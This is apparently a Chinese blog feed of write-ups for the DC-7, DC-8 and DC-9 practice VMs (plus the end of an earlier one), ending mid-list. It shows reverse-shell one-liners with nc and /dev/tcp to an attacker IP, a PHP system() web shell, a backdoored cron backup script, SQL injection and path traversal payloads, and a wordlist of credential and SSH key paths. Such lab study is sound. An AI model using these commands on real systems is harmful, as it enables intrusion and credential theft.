<p><img src="image-20210615184449384.png" alt="image-20210615184449384"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这个靶机几乎全是靠提示过来的,wpscan更新换代太快了,以至于找到的命令都没用了,爆破用户用的bp,爆破用户密码的时候还是自己看help搞明白的.<br>getshell的过程也挺离谱的,网上查wp后台getshell很容易,但是我却不认识activity_monitor是插件,见得太少了,<br>反弹shell我用的<br>    bash -i &gt;% /dev/tcp/192.168.101.130/1234 0&gt;%1<br>没用反应,<br>用<br>    nc 192.168.101.130 1234 -e /bin/bash<br>这个就可以,不是很明白为什么<br>后面的过程就更不用说了,倒是学会了用这两个东西来找可以提权的东西,然后再对症下药<br>find / -perm -u=s -type f 2&gt;/dev/null<br>sudo -l</p>
]]></content>
  </entry>
  <entry>
    <title>DC-7</title>
    <url>/2021/06/15/DC-7-This-is-Y/</url>
    <content><![CDATA[<p>运行虚拟机，有ip<br>192.168.101.136<br>就跳过找ip的步骤</p>
<p>端口，少的可怜，不过开了22</p>
<p><img src="image-20210615195315898.png" alt="image-20210615195315898"></p>
<p>目录没有什么特别的发现，有一个robots.txt</p>
<p><a class="link" href="http://192.168.101.136/robots.txt">http://192.168.101.136/robots.txt<i class="fas fa-external-link-alt"></i></a></p>
<h2 id="github找到敏感信息"><a href="#github找到敏感信息" class="headerlink" title="github找到敏感信息"></a>github找到敏感信息</h2><p>去谷歌搜了一下@DC7USER<br>DC7user<br>然后找到了这个<br><a class="link" href="https://github.com/Dc7User/staffdb">https://github.com/Dc7User/staffdb<i class="fas fa-external-link-alt"></i></a><br>下载过来看一下</p>
<p>在config.php里找到这个<br>dc7user<br>MdR3xOgB7#dW</p>
<p><img src="image-20210615200413283.png" alt="image-20210615200413283"></p>
<p>但是我只扫到22和80端口，所以用这个账号密码去试着连接一下ssh<br>还真成了</p>
<p><img src="image-20210615200601267.png" alt="image-20210615200601267"></p>
<p>sudo -l<br>find / -perm -u=s -type f 2&gt;/dev/null<br>都没有东西</p>
<p><img src="image-20210615200926046.png" alt="image-20210615200926046"></p>
<p>在/home/dc7user目录下，有个backup文件夹和mbox文件，看了一下mbox，应该是邮件文件</p>
<p><img src="image-20210615201036925.png" alt="image-20210615201036925"></p>
<p>像是日志，里面分析出来的有用的信息有，<br> /opt/scripts/backups.sh<br> /home/dc7user/backups/website.sql</p>
<p><img src="image-20210615202334847.png" alt="image-20210615202334847"></p>
<p><img src="image-20210615202358421.png" alt="image-20210615202358421"></p>
<p>sh文件先放一边，gpg是一种加密文件，去百度了，看不懂，<br>回到sh文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">rm &#x2F;home&#x2F;dc7user&#x2F;backups&#x2F;*</span><br><span class="line">cd &#x2F;var&#x2F;www&#x2F;html&#x2F;</span><br><span class="line">drush sql-dump --result-file&#x3D;&#x2F;home&#x2F;dc7user&#x2F;backups&#x2F;website.sql</span><br><span class="line">cd ..</span><br><span class="line">tar -czf &#x2F;home&#x2F;dc7user&#x2F;backups&#x2F;website.tar.gz html&#x2F;</span><br><span class="line">gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric &#x2F;home&#x2F;dc7user&#x2F;backups&#x2F;website.sql</span><br><span class="line">gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric &#x2F;home&#x2F;dc7user&#x2F;backups&#x2F;website.tar.gz</span><br><span class="line">chown dc7user:dc7user &#x2F;home&#x2F;dc7user&#x2F;backups&#x2F;*</span><br><span class="line">rm &#x2F;home&#x2F;dc7user&#x2F;backups&#x2F;website.sql</span><br><span class="line">rm &#x2F;home&#x2F;dc7user&#x2F;backups&#x2F;website.tar.gz</span><br></pre></td></tr></table></figure>
<p>在我一步一步跟着shell文件走时，突然来了个这个</p>
<p><img src="image-20210615210208038.png" alt="image-20210615210208038"></p>
<p>没啥用，再来一次，这次得到了未加密的文件</p>
<p><img src="image-20210615210849864.png" alt="image-20210615210849864"></p>
<p>用xshell连上，再用xftp把文件下载到本地</p>
<p>可以看到用的是mariadb，其他的我什么都没找到</p>
<p><img src="image-20210615212026712.png" alt="image-20210615212026712"></p>
<p>这边倒是有东西</p>
<p><img src="image-20210615212041261.png" alt="image-20210615212041261"></p>
<p>既然有这么些漏洞，我就去google搜一下<br><del>没找到可以利用的！！</del></p>
<h2 id="连接上数据库"><a href="#连接上数据库" class="headerlink" title="连接上数据库"></a>连接上数据库</h2><p>看了一样别人的博客，在/var/www/html/sites/default下的setting.php文件里找到了东西<br>数据库的账户<br>db7user<br>yNv3Po00</p>
<p><img src="image-20210615213202755.png" alt="image-20210615213202755"></p>
<p>在 select * from d7db.users_field_data里找到了admin账号和密码<br>但是解密不出来，卡了一天，参考了一下别人的，可以用drush来修改密码<br>    drush user-password admin –password=”12345”<br>然后回到网站<br><a class="link" href="http://192.168.101.136/user/login">http://192.168.101.136/user/login<i class="fas fa-external-link-alt"></i></a><br>用admin<br>12345<br>登录网站</p>
<h2 id="反弹www-data的shell，修改backups文件"><a href="#反弹www-data的shell，修改backups文件" class="headerlink" title="反弹www-data的shell，修改backups文件"></a>反弹www-data的shell，修改backups文件</h2><p>使用drupal的反弹shell，添加插件<br><a class="link" href="http://drupal.org/project/php">http://drupal.org/project/php<i class="fas fa-external-link-alt"></i></a><br>在extend-&gt; install new module-&gt;添加下载的php插件<br>然后在extend里找到他，勾选，启用</p>
<p><img src="image-20210617111425619.png" alt="image-20210617111425619"></p>
<p>之后在content-&gt; add  content -&gt; basic page    里写入<br>    <?php system($_GET['a'])?><br>注意修改text format为phpcode,保存，预览，在url后面加上<br>    ?a=nc -e /bin/bash 192.168.243.131 4446<br>来反弹shell。拿到www-data的权限后，</p>
<p><img src="image-20210617112439966.png" alt="image-20210617112439966"></p>
<p>然后修改backups.sh文件，<br>    echo “rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.243.131 4445 &gt;/tmp/f “&gt;backups.sh<br>用它的定时任务，反弹一个root权限的shell回来<br>要点耐心，需要等一会，</p>
<p><img src="image-20210617121256110.png" alt="image-20210617121256110"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这一篇记录得有些乱，这个靶机看来作者是想让我们从github来找敏感信息，找到后使用ssh连上后，后面的操作我确实想不到，从网页设置文件中找到了数据库密码，连上数据库后修改admin用户的密码，再在网页中使用admin用户反弹更高权限的shell，然后就是和上一个靶机类似操作的，修改shell文件，利用定时任务来提权</p>
]]></content>
  </entry>
  <entry>
    <title>DC-8</title>
    <url>/2021/06/17/DC-8-This-is-Y/</url>
    <content><![CDATA[<p>IP确认：192.168.243.134</p>
<h2 id="注入拿后台账户"><a href="#注入拿后台账户" class="headerlink" title="注入拿后台账户"></a>注入拿后台账户</h2><p>打开网页的时候看到<a class="link" href="http://192.168.243.134/?nid=1">http://192.168.243.134/?nid=1<i class="fas fa-external-link-alt"></i></a> 有个id<br>在searchsploit查的时候看到好几个注入</p>
<p><img src="image-20210617132751781.png" alt="image-20210617132751781"></p>
<p>就直接丢sqlmap跑了<br>一步一步查过去，<br>有两个库<br>d7db,information_schema<br>d7db下面有给users表，里面有admin和john两个用户的信息</p>
<pre><code>+---------+---------------------------------------------------------+
| name    | pass                                                    |
+---------+---------------------------------------------------------+
| &lt;blank&gt; | &lt;blank&gt;                                                 |
| admin   | $S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z |
| john    | $S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/3if/oRVZJaz5mKC2vF |
+---------+---------------------------------------------------------+
</code></pre>
<p><img src="image-20210617133348566.png" alt="image-20210617133348566"></p>
<p>登录入口虽然在页面不见了，但还是在的<br>192.168.243.134/user</p>
<p>把密码用john解密</p>
<p><img src="image-20210617150600575.png" alt="image-20210617150600575"></p>
<p>密码解密出来一个turtle<br>测试是john的密码<br>    john<br>    turtle</p>
<h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>登录进去后，在contact us的编辑那里找到了可以反弹shell的地方，但是我自己用的时候，把</p><p>flag</p>给删掉了，结果就用不了，后面看了别人的才成功<br>先编写好要执行的命令，我这边是直接反弹shell<br>所以写的是<p></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;p&gt;flag&lt;/p&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> system(<span class="string">&#x27;nc -e /bin/bash 192.168.243.130 4444&#x27;</span>)<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>


<p><img src="image-20210617161947709.png" alt="image-20210617161947709"></p>
<p>保存后，去contact us随便提交一点什么东西</p>
<p><img src="image-20210617162115369.png" alt="image-20210617162115369"><br>kali这边就接收到了shell了</p>
<p><img src="image-20210617162143755.png" alt="image-20210617162143755"></p>
<p>用  python -c ‘import pty; pty.spawn(“/bin/bash”)’<br>获取一个完全交互的shell</p>
<p>然后又是翻箱倒柜的找有用的信息<br>依然是在/var/www/html/sites/default/settings.php里找到了数据库密码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dbuser</span><br><span class="line">4nB90JumP</span><br></pre></td></tr></table></figure>
<p><img src="image-20210617162411546.png" alt="image-20210617162411546"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>连进去找了一会才想起来,我就是用的注入进来的.<br>在继续翻箱倒柜找<br>sudo -l需要www-data的密码<br>find / * -perm -u=s -type f 2&gt;/dev/null的结果如下</p>
<p><img src="image-20210617171914113.png" alt="image-20210617171914113"></p>
<p>在看passwd文件的时候,发现有这个用户Debian-exim</p>
<p><img src="image-20210617172107085.png" alt="image-20210617172107085"></p>
<p>结合上面用find找到的exim4,这里应该有问题,</p>
<p>百度查了一下:<a class="link" href="https://blog.csdn.net/qq_34965596/article/details/104658544">https://blog.csdn.net/qq_34965596/article/details/104658544<i class="fas fa-external-link-alt"></i></a></p>
<p>然后就成了</p>
<p><img src="image-20210617172931950.png" alt="image-20210617172931950"></p>
<p><img src="image-20210617173526965.png" alt="image-20210617173526965"></p>
<p>值得一提的是,这个shell很不稳定</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>注入使用的sqlmap,找到密码很快,但是解密却花了一些时间,没有想到用john来处理,把密文丢进去,直接john pass.txt解密就好了<br>第二个地方是在后台getshell的地方,这个我也是找到了地方,但是我把</p><p>flag</p>给删了,导致后续反弹不出来,也挺蛋疼的,<p></p>
]]></content>
  </entry>
  <entry>
    <title>DC-9</title>
    <url>/2021/06/17/DC-9-This-is-Y/</url>
    <content><![CDATA[<p>确定IP:192.168.243.135<br>端口:经典22,80<br>目录扫描<img src="image-20210617210023669.png" alt="image-20210617210023669"></p>
<h2 id="注入拿敏感数据"><a href="#注入拿敏感数据" class="headerlink" title="注入拿敏感数据"></a>注入拿敏感数据</h2><p><a class="link" href="http://192.168.243.135/results.php">http://192.168.243.135/results.php<i class="fas fa-external-link-alt"></i></a> 搜索页面,payload为’or 1=1 ##时<br><img src="image-20210617180528043.png" alt="image-20210617180528043"><br>显示出了所以信息,确定是有注入了,丢sqlmap跑一下，找到了结果<br>有三个库users，Staff，information_schema<br>users下有一个表UserDetails ，Staff下有两个Users  ，StaffDetails ，<br>UserDetails表里的数据<br>    <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[17 entries]</span><br><span class="line">+-----------+---------------+</span><br><span class="line">| username  | password      |</span><br><span class="line">+-----------+---------------+</span><br><span class="line">| marym     | 3kfs86sfd     |</span><br><span class="line">| julied    | 468sfdfsd2    |</span><br><span class="line">| fredf     | 4sfd87sfd1    |</span><br><span class="line">| barneyr   | RocksOff      |</span><br><span class="line">| tomc      | TC&amp;TheBoyz    |</span><br><span class="line">| jerrym    | B8m#48sd      |</span><br><span class="line">| wilmaf    | Pebbles       |</span><br><span class="line">| bettyr    | BamBam01      |</span><br><span class="line">| chandlerb | UrAG0D!       |</span><br><span class="line">| joeyt     | Passw0rd      |</span><br><span class="line">| rachelg   | yN72#dsd      |</span><br><span class="line">| rossg     | ILoveRachel   |</span><br><span class="line">| monicag   | 3248dsds7s    |</span><br><span class="line">| phoebeb   | smellycats    |</span><br><span class="line">| scoots    | YR3BVxxxw87   |</span><br><span class="line">| janitor   | Ilovepeepee   |</span><br><span class="line">| janitor2  | Hawaii-Five-0 |</span><br><span class="line">+-----------+---------------+</span><br></pre></td></tr></table></figure></p>
<p>Users表里的数据<br>    <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+----------------------------------+----------+</span><br><span class="line">| Password                         | username |</span><br><span class="line">+----------------------------------+----------+</span><br><span class="line">| 856f5de590ef37314e7c3bdf6f8a66dc | admin    |</span><br><span class="line">+----------------------------------+----------+</span><br></pre></td></tr></table></figure><br>StaffDetails表下只有用户信息，没有密码之类的，就没有dump了</p>
<p>admin的那条密码在somd5.com解码出来了<br>admin<br>transorbital1</p>
<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p>后台有一个插入数据的功能，应该是要用这个来getshell，<br>试了一些办法，没成功<br>后面看别人的，还是dc-5那个文件包含<br>拿bp爆破一下参数</p>
<p><img src="image-20210618095436533.png" alt="image-20210618095436533"></p>
<p><a class="link" href="http://192.168.243.135/manage.php?file=../../../../../../etc/passwd">http://192.168.243.135/manage.php?file=../../../../../../etc/passwd<i class="fas fa-external-link-alt"></i></a></p>
<p>可以看到用户挺多的，然后开了22端口，不知道爆破能不能爆出来<br>处理一下数据，准备ssh爆破</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">marym</span><br><span class="line">julied</span><br><span class="line">fredf</span><br><span class="line">barneyr</span><br><span class="line">tomc</span><br><span class="line">jerrym</span><br><span class="line">wilmaf</span><br><span class="line">bettyr</span><br><span class="line">chandlerb</span><br><span class="line">joeyt</span><br><span class="line">rachelg</span><br><span class="line">rossg</span><br><span class="line">monicag</span><br><span class="line">phoebeb</span><br><span class="line">scoots</span><br><span class="line">janitor</span><br><span class="line">janitor2</span><br></pre></td></tr></table></figure>
<p>ssh连接不上，还是准备和dc-5一样的日志getshell吧<br>测了一下，日志读不到，裂开<br>决定爆破一下敏感文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;apache&#x2F;apache&#x2F;conf&#x2F;httpd.conf</span><br><span class="line">&#x2F;apache&#x2F;apache2&#x2F;conf&#x2F;httpd.conf</span><br><span class="line">&#x2F;apache&#x2F;php&#x2F;php.ini</span><br><span class="line">&#x2F;bin&#x2F;php.ini</span><br><span class="line">&#x2F;etc&#x2F;anacrontab</span><br><span class="line">&#x2F;etc&#x2F;apache&#x2F;apache.conf</span><br><span class="line">&#x2F;etc&#x2F;apache&#x2F;httpd.conf</span><br><span class="line">&#x2F;etc&#x2F;apache2&#x2F;apache.conf</span><br><span class="line">&#x2F;etc&#x2F;apache2&#x2F;httpd.conf</span><br><span class="line">&#x2F;etc&#x2F;apache2&#x2F;sites-available&#x2F;default</span><br><span class="line">&#x2F;etc&#x2F;apache2&#x2F;vhosts.d&#x2F;00_default_vhost.conf</span><br><span class="line">&#x2F;etc&#x2F;at.allow</span><br><span class="line">&#x2F;etc&#x2F;at.deny</span><br><span class="line">&#x2F;etc&#x2F;cron.allow</span><br><span class="line">&#x2F;etc&#x2F;cron.deny</span><br><span class="line">&#x2F;etc&#x2F;crontab</span><br><span class="line">&#x2F;etc&#x2F;fstab</span><br><span class="line">&#x2F;etc&#x2F;host.conf</span><br><span class="line">&#x2F;etc&#x2F;httpd&#x2F;conf.d&#x2F;httpd.conf</span><br><span class="line">&#x2F;etc&#x2F;httpd&#x2F;conf.d&#x2F;php.conf</span><br><span class="line">&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf</span><br><span class="line">&#x2F;etc&#x2F;httpd&#x2F;htdocs&#x2F;index.html</span><br><span class="line">&#x2F;etc&#x2F;httpd&#x2F;htdocs&#x2F;index.php</span><br><span class="line">&#x2F;etc&#x2F;httpd&#x2F;logs&#x2F;access.log</span><br><span class="line">&#x2F;etc&#x2F;httpd&#x2F;logs&#x2F;access_log</span><br><span class="line">&#x2F;etc&#x2F;httpd&#x2F;logs&#x2F;error.log</span><br><span class="line">&#x2F;etc&#x2F;httpd&#x2F;logs&#x2F;error_log</span><br><span class="line">&#x2F;etc&#x2F;httpd&#x2F;php.ini</span><br><span class="line">&#x2F;etc&#x2F;init.d&#x2F;httpd</span><br><span class="line">&#x2F;etc&#x2F;init.d&#x2F;mysql</span><br><span class="line">&#x2F;etc&#x2F;ld.so.conf</span><br><span class="line">&#x2F;etc&#x2F;motd</span><br><span class="line">&#x2F;etc&#x2F;my.cnf</span><br><span class="line">&#x2F;etc&#x2F;mysql&#x2F;my.cnf</span><br><span class="line">&#x2F;etc&#x2F;mysql&#x2F;my.cnf</span><br><span class="line">&#x2F;etc&#x2F;network&#x2F;interfaces</span><br><span class="line">&#x2F;etc&#x2F;networks</span><br><span class="line">&#x2F;etc&#x2F;passwd</span><br><span class="line">&#x2F;etc&#x2F;php.ini</span><br><span class="line">&#x2F;etc&#x2F;php&#x2F;apache&#x2F;php.ini</span><br><span class="line">&#x2F;etc&#x2F;php&#x2F;apache2&#x2F;php.ini</span><br><span class="line">&#x2F;etc&#x2F;php&#x2F;cgi&#x2F;php.ini</span><br><span class="line">&#x2F;etc&#x2F;php&#x2F;php.ini</span><br><span class="line">&#x2F;etc&#x2F;php&#x2F;php4&#x2F;php.ini</span><br><span class="line">&#x2F;etc&#x2F;php4.4&#x2F;fcgi&#x2F;php.ini</span><br><span class="line">&#x2F;etc&#x2F;php4&#x2F;apache&#x2F;php.ini</span><br><span class="line">&#x2F;etc&#x2F;php4&#x2F;apache2&#x2F;php.ini</span><br><span class="line">&#x2F;etc&#x2F;php4&#x2F;cgi&#x2F;php.ini</span><br><span class="line">&#x2F;etc&#x2F;php5&#x2F;apache&#x2F;php.ini</span><br><span class="line">&#x2F;etc&#x2F;php5&#x2F;apache2&#x2F;php.ini</span><br><span class="line">&#x2F;etc&#x2F;php5&#x2F;cgi&#x2F;php.ini</span><br><span class="line">&#x2F;etc&#x2F;phpmyadmin&#x2F;config.inc.php</span><br><span class="line">&#x2F;etc&#x2F;resolv.conf</span><br><span class="line">&#x2F;etc&#x2F;shadow</span><br><span class="line">&#x2F;etc&#x2F;ssh&#x2F;sshd_config</span><br><span class="line">&#x2F;etc&#x2F;ssh&#x2F;sshd_config</span><br><span class="line">&#x2F;etc&#x2F;ssh&#x2F;ssh_config</span><br><span class="line">&#x2F;etc&#x2F;ssh&#x2F;ssh_config</span><br><span class="line">&#x2F;etc&#x2F;ssh&#x2F;ssh_host_dsa_key</span><br><span class="line">&#x2F;etc&#x2F;ssh&#x2F;ssh_host_dsa_key</span><br><span class="line">&#x2F;etc&#x2F;ssh&#x2F;ssh_host_dsa_key.pub</span><br><span class="line">&#x2F;etc&#x2F;ssh&#x2F;ssh_host_dsa_key.pub</span><br><span class="line">&#x2F;etc&#x2F;ssh&#x2F;ssh_host_key</span><br><span class="line">&#x2F;etc&#x2F;ssh&#x2F;ssh_host_key</span><br><span class="line">&#x2F;etc&#x2F;ssh&#x2F;ssh_host_key.pub</span><br><span class="line">&#x2F;etc&#x2F;ssh&#x2F;ssh_host_key.pub</span><br><span class="line">&#x2F;etc&#x2F;ssh&#x2F;ssh_host_rsa_key</span><br><span class="line">&#x2F;etc&#x2F;ssh&#x2F;ssh_host_rsa_key</span><br><span class="line">&#x2F;etc&#x2F;ssh&#x2F;ssh_host_rsa_key.pub</span><br><span class="line">&#x2F;etc&#x2F;ssh&#x2F;ssh_host_rsa_key.pub</span><br><span class="line">&#x2F;etc&#x2F;sysconfig&#x2F;network</span><br><span class="line">&#x2F;etc&#x2F;sysconfig&#x2F;network</span><br><span class="line">&#x2F;home&#x2F;apache&#x2F;conf&#x2F;httpd.conf</span><br><span class="line">&#x2F;home&#x2F;apache2&#x2F;conf&#x2F;httpd.conf</span><br><span class="line">&#x2F;home&#x2F;bin&#x2F;stable&#x2F;apache&#x2F;php.ini</span><br><span class="line">&#x2F;home2&#x2F;bin&#x2F;stable&#x2F;apache&#x2F;php.ini</span><br><span class="line">&#x2F;NetServer&#x2F;bin&#x2F;stable&#x2F;apache&#x2F;php.ini</span><br><span class="line">&#x2F;opt&#x2F;www&#x2F;conf&#x2F;httpd.conf</span><br><span class="line">&#x2F;opt&#x2F;www&#x2F;htdocs&#x2F;index.html</span><br><span class="line">&#x2F;opt&#x2F;www&#x2F;htdocs&#x2F;index.php</span><br><span class="line">&#x2F;opt&#x2F;xampp&#x2F;etc&#x2F;php.ini</span><br><span class="line">&#x2F;PHP&#x2F;php.ini</span><br><span class="line">&#x2F;php&#x2F;php.ini</span><br><span class="line">&#x2F;php4&#x2F;php.ini</span><br><span class="line">&#x2F;php5&#x2F;php.ini</span><br><span class="line">&#x2F;root&#x2F;.atftp_history</span><br><span class="line">&#x2F;root&#x2F;.bashrc</span><br><span class="line">&#x2F;root&#x2F;.bash_history</span><br><span class="line">&#x2F;root&#x2F;.mysql_history</span><br><span class="line">&#x2F;root&#x2F;.nano_history</span><br><span class="line">&#x2F;root&#x2F;.php_history</span><br><span class="line">&#x2F;root&#x2F;.profile</span><br><span class="line">&#x2F;root&#x2F;.ssh&#x2F;authorized_keys</span><br><span class="line">&#x2F;root&#x2F;.ssh&#x2F;identity</span><br><span class="line">&#x2F;root&#x2F;.ssh&#x2F;identity.pub</span><br><span class="line">&#x2F;root&#x2F;.ssh&#x2F;id_dsa</span><br><span class="line">&#x2F;root&#x2F;.ssh&#x2F;id_dsa.pub</span><br><span class="line">&#x2F;root&#x2F;.ssh&#x2F;id_rsa</span><br><span class="line">&#x2F;root&#x2F;.ssh&#x2F;id_rsa.pub</span><br><span class="line">&#x2F;root&#x2F;anaconda-ks.cfg</span><br><span class="line">&#x2F;tmp&#x2F;apache&#x2F;htdocs&#x2F;index.html</span><br><span class="line">&#x2F;tmp&#x2F;apache&#x2F;htdocs&#x2F;index.php</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;php.ini</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;php&#x2F;php.ini</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;apache&#x2F;conf&#x2F;httpd.conf</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;apache&#x2F;conf&#x2F;php.ini</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;apache&#x2F;htdocs&#x2F;index.html</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;apache&#x2F;htdocs&#x2F;index.php</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;apache&#x2F;logs&#x2F;access.log</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;apache&#x2F;logs&#x2F;access_log</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;apache&#x2F;logs&#x2F;access_logaccess_log.old</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;apache&#x2F;logs&#x2F;error.log</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;apache&#x2F;logs&#x2F;error_log</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;apache&#x2F;logs&#x2F;error_logerror_log.old</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;apache2&#x2F;conf&#x2F;httpd.conf</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;apache2&#x2F;conf&#x2F;php.ini</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;apache2&#x2F;htdocs&#x2F;index.html</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;apache2&#x2F;htdocs&#x2F;index.php</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;cpanel&#x2F;logs</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;cpanel&#x2F;logs&#x2F;access_log</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;cpanel&#x2F;logs&#x2F;error_log</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;cpanel&#x2F;logs&#x2F;license_log</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;cpanel&#x2F;logs&#x2F;login_log</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;cpanel&#x2F;logs&#x2F;stats_log</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;cpanel&#x2F;logs&#x2F;stats_log</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;etc&#x2F;php.ini</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;httpd&#x2F;conf&#x2F;httpd.conf</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;httpd2.2&#x2F;htdocs&#x2F;index.html</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;httpd2.2&#x2F;htdocs&#x2F;index.php</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php.ini</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;mysql&#x2F;bin&#x2F;mysql</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;mysql&#x2F;my.cnf</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;php&#x2F;lib&#x2F;php.ini</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;php4&#x2F;lib&#x2F;php.ini</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;php4&#x2F;lib&#x2F;php.ini</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;php4&#x2F;php.ini</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;php5&#x2F;etc&#x2F;php.ini</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;php5&#x2F;lib&#x2F;php.ini</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;php5&#x2F;php5.ini</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;share&#x2F;examples&#x2F;php&#x2F;php.ini</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;share&#x2F;examples&#x2F;php4&#x2F;php.ini</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;tomcat5527&#x2F;bin&#x2F;version.sh</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;Zend&#x2F;etc&#x2F;php.ini</span><br><span class="line">&#x2F;usr&#x2F;share&#x2F;tomcat6&#x2F;bin&#x2F;startup.sh</span><br><span class="line">&#x2F;usr&#x2F;tomcat6&#x2F;bin&#x2F;startup.sh</span><br><span class="line">&#x2F;var&#x2F;apache2&#x2F;config.inc</span><br><span class="line">&#x2F;var&#x2F;httpd&#x2F;conf&#x2F;httpd.conf</span><br><span class="line">&#x2F;var&#x2F;httpd&#x2F;conf&#x2F;php.ini</span><br><span class="line">&#x2F;var&#x2F;httpd&#x2F;conf&#x2F;php.ini</span><br><span class="line">&#x2F;var&#x2F;httpd&#x2F;htdocs&#x2F;index.html</span><br><span class="line">&#x2F;var&#x2F;httpd&#x2F;htdocs&#x2F;index.php</span><br><span class="line">&#x2F;var&#x2F;lib&#x2F;mysql&#x2F;my.cnf</span><br><span class="line">&#x2F;var&#x2F;lib&#x2F;mysql&#x2F;mysql&#x2F;user.MYD</span><br><span class="line">&#x2F;var&#x2F;local&#x2F;www&#x2F;conf&#x2F;httpd.conf</span><br><span class="line">&#x2F;var&#x2F;local&#x2F;www&#x2F;conf&#x2F;php.ini</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;access.log</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;access_log</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;apache&#x2F;access.log</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;apache&#x2F;access_log</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;apache&#x2F;error.log</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;apache&#x2F;error_log</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;apache2&#x2F;access_log</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;apache2&#x2F;error.log</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;apache2&#x2F;error_log</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;error.log</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;error_log</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;mysql.log</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;mysql&#x2F;mysql-bin.log</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;mysql&#x2F;mysql-slow.log</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;mysql&#x2F;mysql.log</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;mysqlderror.log</span><br><span class="line">&#x2F;var&#x2F;mail&#x2F;root</span><br><span class="line">&#x2F;var&#x2F;mysql.log</span><br><span class="line">&#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;root</span><br><span class="line">&#x2F;var&#x2F;spool&#x2F;mail&#x2F;root</span><br><span class="line">&#x2F;var&#x2F;www&#x2F;conf&#x2F;httpd.conf</span><br><span class="line">&#x2F;var&#x2F;www&#x2F;htdocs&#x2F;index.html</span><br><span class="line">&#x2F;var&#x2F;www&#x2F;htdocs&#x2F;index.php</span><br><span class="line">&#x2F;var&#x2F;www&#x2F;index.html</span><br><span class="line">&#x2F;var&#x2F;www&#x2F;index.php</span><br><span class="line">&#x2F;var&#x2F;www&#x2F;logs&#x2F;access.log</span><br><span class="line">&#x2F;var&#x2F;www&#x2F;logs&#x2F;access_log</span><br><span class="line">&#x2F;var&#x2F;www&#x2F;logs&#x2F;error.log</span><br><span class="line">&#x2F;var&#x2F;www&#x2F;logs&#x2F;error_log</span><br><span 